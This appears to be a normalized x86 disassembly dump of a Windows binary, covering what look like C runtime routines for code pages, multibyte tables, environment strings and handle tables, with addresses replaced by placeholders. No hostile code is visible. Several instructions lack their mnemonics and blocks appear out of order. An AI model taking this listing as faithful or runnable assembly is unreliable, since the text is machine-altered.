[ eax ]
pop esi
retn
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_411e2d
pop ecx
sub_416887
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x1
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4168c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_40ee04
and [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_416938
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_40be70
mov [ ebx + 0x4 ] edi
xor eax eax
mov [ ebx + 0x8 ] edi
add esp 0xc
mov [ ebx + 0x21c ] edi
mov ecx 0x101
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
sub edi ebx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
sub ecx 0x1
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
sub edx 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41699d
mov edi edi
push ebp
mov ebp esp
sub esp 0x720
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x718 ]
push edi
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
mov ecx ebx
pop eax
sub eax edx
mov [ ebp - 0x720 ] eax
mov eax ebx
cmp [ ebp - 0x71c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x712 ]
lea ecx [ ebp - 0x712 ]
mov [ ebp - 0x104 ] 0x20
jmp r-xdata
mov [ edx ] bl
lea eax [ esi + ecx ]
or [ eax + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x71c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x720 ]
lea edx [ esi + 0x119 ]
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x704 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_4175e0
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_418d7f
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_418d7f
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x704 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_416b31
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
call sub_41320e
mov [ ebp - 0x4 ] eax
call sub_416c50
push [ ebp + 0x8 ]
call sub_4168c5
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ecx + 0x48 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
push ebx
push esi
push edi
push 0x220
call sub_411e67
mov edi eax
or ebx 0xffffffff
pop ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov esi ebx
mov esi [ ebp - 0x4 ]
mov ecx 0x88
mov esi [ esi + 0x48 ]
[ edi ] [ esi ]
mov edi eax
push edi
push [ ebp - 0xc ]
and [ edi ] 0x0
call sub_416cf2
mov esi eax
pop ecx
pop ecx
cmp esi ebx
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_4135e3
mov [ eax ] 0x16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
[ eax ] ebx
dec ebx
jne r-xdata
call sub_41173d
mov [ edi ] 0x1
mov ecx edi
mov eax [ ebp - 0x4 ]
xor edi edi
mov [ eax + 0x48 ] ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] rw-data
je r-xdata
push edi
call sub_411e2d
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
test [ rw-data ] 0x1
jne r-xdata
push [ eax + 0x48 ]
call sub_411e2d
pop ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x5
call sub_41679b
cmp [ ebp + 0xc ] 0x0
pop ecx
pop ecx
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
sub_416c50
push 0xc
push r--data
call sub_40b2f0
xor esi esi
mov [ ebp - 0x1c ] esi
call sub_41320e
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x5
call sub_4129a2
pop ecx
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x48 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x4c ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416ce1
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x48 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x48 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
[ esi ]
or eax 0xffffffff
[ esi ] eax
jne r-xdata
mov eax esi
call sub_40b336
retn
call sub_411eb5
cmp esi rw-data
je r-xdata
push esi
call sub_411e2d
pop ecx
sub_416cf2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_4168c5
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov eax edi
mov [ ebp - 0x1c ] ecx
push esi
call sub_416938
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_40be70
add esp 0xc
imul eax [ ebp - 0x1c ] 0x30
mov [ ebp - 0x20 ] eax
lea eax [ eax + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_416887
add esp 0x4
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x20 ]
lea ecx [ esi + 0xc ]
push 0x6
lea edx [ eax + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx edx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
lea edx [ edx + 0x2 ]
mov [ ecx ] ax
lea ecx [ ecx + 0x2 ]
sub edi 0x1
jne r-xdata
push esi
call sub_41699d
cmp edx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + edx + 0x19 ] al
inc edx
movzx eax [ ecx + 0x1 ]
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_40be70
mov [ esi + 0x4 ] ebx
add esp 0xc
xor ebx ebx
mov [ esi + 0x21c ] edi
inc ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_416938
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
or [ eax ] 0x8
inc eax
sub ecx 0x1
jne r-xdata
push [ esi + 0x4 ]
call sub_416887
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx edx cl
movzx ecx [ eax ]
jmp r-xdata
xor eax eax
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_416ee3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_4135e3
push 0x16
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_40be70
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_4135e3
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_40b8f0
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_4135e3
push 0x22
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
pop edi
sub_416f64
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40ee04
movzx esi [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x14 ]
test [ eax + esi + 0x19 ] cl
jne r-xdata
xor edx edx
inc edx
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax edx
mov eax [ ebp - 0xc ]
mov eax [ eax ]
movzx eax [ eax + esi * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test eax eax
je r-xdata
sub_416ff1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ edx ] di
je r-xdata
lea eax [ edx + 0x2 ]
pop edi
pop ebp
retn
push esi
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx esi
sar ecx 0x1
lea edx [ edx + ecx * 2 ]
add edx 0x2
cmp [ edx ] di
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x2 ]
pop esi
sub_417028
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
xor edi edi
test esi esi
je r-xdata
mov ebx edi
push esi
call sub_416ff1
pop ecx
push edi
push edi
push edi
mov ebx eax
push edi
sub ebx esi
sar ebx 0x1
push ebx
push esi
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push esi
call [ FreeEnvironmentStringsW@IAT ]
push eax
call sub_411e67
mov edi eax
pop ecx
test edi edi
je r-xdata
xor ebx ebx
xor eax eax
push eax
push eax
push [ ebp - 0x4 ]
push edi
push ebx
push esi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov ebx edi
xor edi edi
jmp r-xdata
push edi
call sub_411e2d
pop ecx
jmp r-xdata
sub_4170ab
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
push 0x30
push 0x40
call sub_411ef8
mov edi eax
xor ebx ebx
mov [ ebp - 0x8 ] edi
pop ecx
pop ecx
test edi edi
jne r-xdata
lea eax [ edi + 0xc00 ]
cmp edi eax
je r-xdata
mov edi ebx
jmp r-xdata
push ebx
call sub_411e2d
pop ecx
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + 0x20 ]
mov edi eax
push ebx
push 0xfa0
lea eax [ esi - 0x20 ]
push eax
call sub_412c73
or [ esi - 0x8 ] 0xffffffff
mov [ esi ] ebx
lea esi [ esi + 0x30 ]
mov [ esi - 0x2c ] ebx
lea eax [ esi - 0x20 ]
mov [ esi - 0x28 ] 0xa0a0000
mov [ esi - 0x24 ] 0xa
and [ esi - 0x23 ] 0xf8
mov [ esi - 0x22 ] bl
cmp eax edi
jne r-xdata
mov edi [ ebp - 0x8 ]
pop esi
sub_417125
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push ebx
lea ebx [ esi + 0xc00 ]
push edi
mov edi esi
cmp esi ebx
je r-xdata
push esi
call sub_411e2d
pop ecx
pop edi
pop ebx
push edi
call [ DeleteCriticalSection@IAT ]
add edi 0x30
cmp edi ebx
jne r-xdata
sub_41715a
push 0x14
push r--data
call sub_40b2f0
cmp [ ebp + 0x8 ] 0x2000
sbb eax eax
neg eax
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push 0x7
call sub_4129a2
pop ecx
mov [ ebp - 0x4 ] esi
mov edi esi
mov eax [ rw-data ]
call sub_4135e3
push 0x9
pop esi
mov [ eax ] esi
call sub_413527
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4171e9
jmp r-xdata
cmp [ edi * 4 + rw-data ] esi
jne r-xdata
mov eax esi
call sub_40b336
retn
inc edi
jmp r-xdata
call sub_4170ab
mov [ edi * 4 + rw-data ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ rw-data ]
add eax 0x40
mov [ rw-data ] eax
push 0xc
pop esi
mov [ ebp - 0x1c ] esi
sub_4171f2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_417215
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417238
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
js r-xdata
call sub_4135e3
mov [ eax ] 0x9
call sub_4135d0
and [ eax ] 0x0
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov eax esi
mov edi esi
and eax 0x3f
sar edi 0x6
imul ebx eax 0x30
mov eax [ edi * 4 + rw-data ]
test [ ebx + eax + 0x28 ] 0x1
je r-xdata
cmp [ ebx + eax + 0x18 ] 0xffffffff
je r-xdata
call sub_411068
cmp eax 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ ebx + eax + 0x18 ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub esi eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
push 0xfffffff6
sub esi 0x1
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
sub esi 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_4172c9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
jmp r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
call sub_413527
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
mov eax [ eax + ecx + 0x18 ]
pop ebp
retn
sub_417333
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_41320e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_414f8c
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax ]
mov esp ebp
pop ebp
retn
sub_417359
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
push eax
call sub_411e2d
pop ecx
sub_417457
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_411e2d
pop ecx
push eax
call sub_411e2d
pop ecx
sub_4174c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + eax * 4 ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_411e2d
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_4174fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push 0x7
push esi
call sub_4174c0
lea eax [ esi + 0x1c ]
push 0x7
push eax
call sub_4174c0
lea eax [ esi + 0x38 ]
push 0xc
push eax
call sub_4174c0
lea eax [ esi + 0x68 ]
push 0xc
push eax
call sub_4174c0
lea eax [ esi + 0x98 ]
push 0x2
push eax
call sub_4174c0
push [ esi + 0xa0 ]
call sub_411e2d
push [ esi + 0xa4 ]
call sub_411e2d
push [ esi + 0xa8 ]
call sub_411e2d
lea eax [ esi + 0xb4 ]
push 0x7
push eax
call sub_4174c0
lea eax [ esi + 0xd0 ]
push 0x7
push eax
call sub_4174c0
add esp 0x44
lea eax [ esi + 0xec ]
push 0xc
push eax
call sub_4174c0
lea eax [ esi + 0x11c ]
push 0xc
push eax
call sub_4174c0
lea eax [ esi + 0x14c ]
push 0x2
push eax
call sub_4174c0
push [ esi + 0x154 ]
call sub_411e2d
push [ esi + 0x158 ]
call sub_411e2d
push [ esi + 0x15c ]
call sub_411e2d
push [ esi + 0x160 ]
call sub_411e2d
add esp 0x28
sub_4175e0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_40ee04
mov ecx [ ebp + 0x1c ]
test ecx ecx
jne r-xdata
xor eax eax
xor edi edi
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov ecx eax
mov [ ebp + 0x1c ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax edi
lea esp [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
and [ eax + 0x350 ] 0xfffffffd
mov esi edi
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
and eax ecx
lea ecx [ ebx + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_4176fd
pop ecx
push ebx
push edi
push esi
call sub_40be70
add esp 0xc
push [ ebp - 0x8 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
push eax
call sub_411e67
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
call sub_41d390
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_4176fd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_411e2d
pop ecx
sub_41771d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
push [ eax + 0x9c ]
call sub_4178e4
pop ecx
pop esi
pop ebp
retn
[ edx ]
sub_41779a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
push [ esi + 0x9c ]
call sub_41790d
pop ecx
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x28 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi + 0x90 ]
sub eax 0xfe
push eax
call sub_411e2d
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_411e2d
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_411e2d
push [ esi + 0x8c ]
call sub_411e2d
add esp 0x10
cmp [ eax ] 0x0
jne r-xdata
add ebx 0x4
add edi 0x10
sub eax 0x1
mov [ ebp - 0x4 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_411e2d
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_411e2d
push [ ebx ]
call sub_411e2d
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_411e2d
pop ecx
push [ esi + 0x7c ]
call sub_411e2d
push [ esi + 0x88 ]
call sub_411e2d
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_411e2d
push [ esi + 0x88 ]
call sub_417359
pop ecx
pop ecx
push eax
call sub_411e2d
push [ esi + 0x88 ]
call sub_417457
pop ecx
pop ecx
sub_4178e4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
pop ebp
retn
cmp ecx r--data
je r-xdata
xor eax eax
inc eax
[ ecx + 0xb0 ] eax
inc eax
pop ebp
retn
sub_41790d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
cmp esi r--data
je r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
jne r-xdata
push esi
call sub_4174fc
push esi
call sub_411e2d
pop ecx
pop ecx
sub_41793d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
pop ebp
retn
cmp ecx r--data
je r-xdata
or eax 0xffffffff
[ ecx + 0xb0 ] eax
dec eax
pop ebp
retn
sub_417966
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
